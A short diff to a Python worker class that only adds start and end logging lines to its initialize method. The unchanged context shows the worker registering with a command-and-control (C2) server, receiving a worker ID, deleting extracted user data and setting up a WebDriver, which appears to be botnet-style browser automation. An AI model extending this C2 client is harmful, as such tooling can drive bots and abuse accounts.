@@ -34,6 +34,7 @@ logging.info("start")
 class Worker:
     
     def initialize(self):
+            logging.info("start initialize")
             response = send_data_to_c2("POST", "initialize/", {})
             if response.status_code==500:
                 logging.error("error in c2 initialize ( check c2 logs )")
@@ -55,6 +56,8 @@ class Worker:
             remove_directory(user_data_file)
             self.id = response.get("worker_id")
             self.user_data_path = "user_data_extracted"
+            logging.info("end initialize")
+
 
     def _get_driver(self):
         print("Setup WebDriver...")
